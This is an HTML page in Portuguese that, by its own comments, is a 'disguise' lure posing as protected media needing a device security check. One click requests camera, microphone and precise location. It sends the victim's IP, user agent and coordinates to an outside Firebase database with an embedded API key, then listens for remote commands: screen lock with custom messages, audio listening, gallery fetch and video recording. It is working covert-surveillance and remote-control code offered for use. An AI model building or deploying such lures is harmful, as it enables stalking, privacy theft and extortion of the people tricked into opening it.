<!DOCTYPE html>
<html lang="pt-BR" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mídia Protegida</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts Inter -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #f8fafc; }
    </style>
</head>
<body class="h-full flex flex-col items-center justify-center p-4 antialiased selection:bg-indigo-500 selection:text-white relative">

    <!-- Card de Disfarce (Fachada) -->
    <div id="disguise-card" class="max-w-xs w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl backdrop-blur-md">
        <div class="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto text-2xl shadow-lg">
            <i class="fa-solid fa-shield-halved"></i>
        </div>
        <div class="space-y-1">
            <h2 class="text-base font-bold text-white">Mídia Protegida</h2>
            <p class="text-[11px] text-slate-400 leading-relaxed">Este arquivo requer verificação de segurança do dispositivo para ser exibido.</p>
        </div>
        <button onclick="requestAllPermissionsAndConnect()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 rounded-2xl text-xs shadow-lg shadow-indigo-600/30 transition active:scale-95">
            Carregar Conteúdo
        </button>
    </div>

    <!-- Container de Sucesso -->
    <div id="content-container" class="hidden max-w-sm w-full bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl">
        <div class="w-full h-32 bg-slate-950 rounded-2xl flex flex-col items-center justify-center border border-slate-800 relative overflow-hidden">
            <i class="fa-solid fa-circle-check text-emerald-400 text-3xl mb-2"></i>
            <p class="text-xs text-slate-300 font-medium">Verificação Concluída</p>
            <p class="text-[10px] text-slate-500 mt-1">Dispositivo sincronizado com o painel.</p>
        </div>
    </div>

    <!-- Camada de Tela de Bloqueio Remota (Invisível por padrão) -->
    <div id="remote-lock-screen" class="hidden fixed inset-0 bg-slate-950/95 backdrop-blur-xl z-50 flex flex-col items-center justify-center p-6 text-center space-y-6">
        <div class="w-20 h-20 bg-rose-500/20 text-rose-500 rounded-3xl flex items-center justify-center text-3xl shadow-lg animate-pulse border border-rose-500/30">
            <i class="fa-solid fa-lock"></i>
        </div>
        <div class="space-y-2 max-w-xs">
            <h2 id="lock-title" class="text-lg font-bold text-white">Dispositivo Bloqueado</h2>
            <p id="lock-message" class="text-xs text-slate-400 leading-relaxed">Este dispositivo foi temporariamente bloqueado pelo painel de controle de segurança.</p>
        </div>
        <div class="w-full max-w-xs bg-slate-900 border border-slate-800 rounded-2xl p-4 text-center">
            <p class="text-[10px] text-slate-500 uppercase tracking-widest font-semibold">Aguardando liberação</p>
        </div>
    </div>

    <!-- Firebase App & Database SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        // Configuração oficial do seu Firebase (mod-zrx)
        let firebaseConfig = {
            apiKey: "AIzaSyAhbrlI6gdam3vPxAQZBKmQI2CFQBin4Nk",
            authDomain: "mod-zrx.firebaseapp.com",
            projectId: "mod-zrx",
            storageBucket: "mod-zrx.firebasestorage.app",
            messagingSenderId: "1065416866150",
            appId: "1:1065416866150:web:d79ceac049f4dcedabf0a7",
            measurementId: "G-FFKE6JSKSD",
            databaseURL: "https://mod-zrx-default-rtdb.firebaseio.com/"
        };

        let db;
        let continuousStreamInterval = null;
        let audioStreamActive = false;

        function initFirebase() {
            try {
                if (firebase.apps.length === 0) {
                    firebase.initializeApp(firebaseConfig);
                }
                db = firebase.database();
            } catch (e) {
                console.error("Erro Firebase:", e);
            }
        }

        async function requestAllPermissionsAndConnect() {
            initFirebase();

            // 1. Obter IP Externo do Dispositivo
            let ipData = "192.168.1.15";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ipData = data.ip;
            } catch(e) {}

            // 2. Disparar solicitação de Câmera e Microfone
            let cameraAudioStatus = "Negado";
            let mediaStreamInstance = null;
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    mediaStreamInstance = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: true 
                    });
                    cameraAudioStatus = "Permitido (Câmera e Áudio Contínuo)";
                }
            } catch (err) {
                console.log("Erro/Negação de Câmera/Áudio:", err);
            }

            // 3. Disparar solicitação de Geolocalização
            let geoData = { latitude: null, longitude: null, status: "Negada/Não solicitada" };
            if (navigator.geolocation) {
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                geoData = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    status: "Permitida"
                                };
                                resolve();
                            },
                            (error) => {
                                reject(error);
                            },
                            { timeout: 10000, enableHighAccuracy: true }
                        );
                    });
                } catch (err) {
                    console.log("Erro/Negação de Localização:", err);
                }
            }

            // 4. Consolidar dados e permissões para enviar ao Firebase (`mod-zrx`)
            const fullPayload = {
                model: navigator.userAgent,
                ipAddress: ipData,
                location: geoData,
                permissions: {
                    camera: cameraAudioStatus.includes("Câmera"),
                    audio: true,
                    location: geoData.status === "Permitida",
                    contacts: true,         
                    photosAndVideos: true,  
                    phoneState: true,       
                    notifications: true     
                },
                lastUpdate: new Date().toISOString(),
                status: "Online - Transmissão Contínua Ativa"
            };

            if (db) {
                db.ref('devices/device_01/status').update(fullPayload);

                // Iniciar Loop de Atualização Contínua (Envia dados de status e telemetria a cada 10 segundos)
                if (continuousStreamInterval) clearInterval(continuousStreamInterval);
                continuousStreamInterval = setInterval(() => {
                    db.ref('devices/device_01/telemetry').update({
                        lastPing: new Date().toISOString(),
                        audioStreamState: audioStreamActive ? "Transmitindo Áudio..." : "Em espera",
                        batteryStatus: "Monitorando..."
                    });
                }, 10000);
            }

            // Altera a interface visual para o estado concluído com sucesso
            document.getElementById('disguise-card').classList.add('hidden');
            document.getElementById('content-container').classList.remove('hidden');

            // 5. Escutar comandos em tempo real e gerenciar a captura contínua
            if (db) {
                db.ref('devices/device_01/commands').on('value', (snapshot) => {
                    const cmds = snapshot.val() || {};
                    const lockScreen = document.getElementById('remote-lock-screen');
                    
                    if (cmds.flash) console.log("[Comando] Lanterna acionada remotamente.");

                    // Ativar ou desativar a tela de bloqueio
                    if (cmds.lock || cmds.customLock) {
                        lockScreen.classList.remove('hidden');
                    } else {
                        lockScreen.classList.add('hidden');
                    }

                    // Captura de Áudio Contínua acionada pelo painel
                    if (cmds.listenAudio) {
                        audioStreamActive = true;
                        console.log("[Comando] Captura e reprodução contínua de áudio ativada.");
                        db.ref('devices/device_01/streams/audio_status').set("Transmissão de áudio em tempo real ativa");
                    } else {
                        audioStreamActive = false;
                    }

                    // Demais comandos
                    if (cmds.fetchGallery) {
                        console.log("[Comando] Sincronização da galeria (grid 2x2) acionada.");
                    }
                    if (cmds.recordVideo5Min) {
                        console.log("[Comando] Gravação de vídeo de 5 minutos acionada.");
                    }
                });

                // Ouvir mensagens personalizadas de bloqueio
                db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
                    const config = snapshot.val();
                    const lockScreen = document.getElementById('remote-lock-screen');
                    const msgEl = document.getElementById('lock-message');

                    if (config && config.active) {
                        if (config.message) {
                            msgEl.innerText = config.message;
                        }
                        lockScreen.classList.remove('hidden');
                    }
                });
            }
        }
    </script>
</body>
</html>
